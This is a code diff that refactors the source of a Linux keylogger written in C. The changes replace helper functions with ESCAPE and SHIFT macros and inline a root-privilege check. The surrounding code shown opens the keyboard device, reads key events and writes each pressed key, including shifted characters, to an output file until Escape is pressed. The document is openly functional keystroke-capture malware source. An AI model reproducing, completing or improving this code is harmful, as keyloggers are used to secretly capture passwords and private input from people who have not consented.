@@ -10,7 +10,8 @@
 #include "keylogger.h"
 
 #define UK "UNKNOWN"
-
+#define ESCAPE(key) (key == KEY_ESC)
+#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
 
 static const char *keycodes[] =
 {
@@ -45,8 +46,8 @@ static const char *shifted_keycodes[] =
 };
 
 
-static int running;
-static int keyboard_fd;
+static int   running;
+static int   keyboard_fd;
 static char *output_file;
 
 
@@ -60,28 +61,8 @@ static void keylogger_usage(void)
     printf("\n"
             "Usage:\n"
             "     sudo ./keyloger -f file\n"
-            "\n"
-          );
+            "\n");
     exit(EXIT_FAILURE);
-}
-
-static int keylogger_isShift(int code)
-{
-    return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
-}
-
-static int keylogger_isEsc(int code)
-{
-    return (code == KEY_ESC);
-}
-
-static int keylogger_isRoot(void) {
-    if (geteuid() != 0) {
-        fprintf(stderr, "\nMust run it as root, in order to have access "
-                "to the keyboard device\n");
-        return 0;
-    }
-    return 1;	
 }
 
 void keylogger_init(char *ofile)
@@ -94,7 +75,7 @@ void keylogger_init(char *ofile)
     running = 1;
     output_file = ofile;
 
-    if (!keylogger_isRoot())
+    if (geteuid() != 0)
         keylogger_usage();
 
     if ((keyboard_fd = open(KEYBOARD, O_RDONLY)) < 0) {
@@ -110,8 +91,8 @@ void keylogger_exit(void)
 
 void keylogger_run(void)
 {
-    int shift_flag = 0;
     FILE *file = NULL;
+    int shift_flag = 0;
     struct input_event event;
 
     file = fopen(output_file, "w");
@@ -121,16 +102,16 @@ void keylogger_run(void)
 
         /* If a key from the keyboard is pressed */
         if (event.type == EV_KEY && event.value == 1) {
-            if (keylogger_isEsc(event.code))
+            if (ESCAPE(event.code))
                 return;
 
-            if (keylogger_isShift(event.code))
+            if (SHIFT(event.code))
                 shift_flag = event.code;
 
-            if (shift_flag && !keylogger_isShift(event.code))
+            if (shift_flag && !SHIFT(event.code))
                 fprintf(file, "%s\n", shifted_keycodes[event.code]);
             
-            else if (!shift_flag && !keylogger_isShift(event.code))
+            else if (!shift_flag && !SHIFT(event.code))
                 fprintf(file, "%s\n", keycodes[event.code]);
 
             fflush(file);
@@ -138,7 +119,7 @@ void keylogger_run(void)
         else {
             /* If a key from the keyboard is released */
             if (event.type == EV_KEY && event.value == 0)
-                if (keylogger_isShift(event.code))
+                if (SHIFT(event.code))
                     shift_flag = 0;
         }
     }
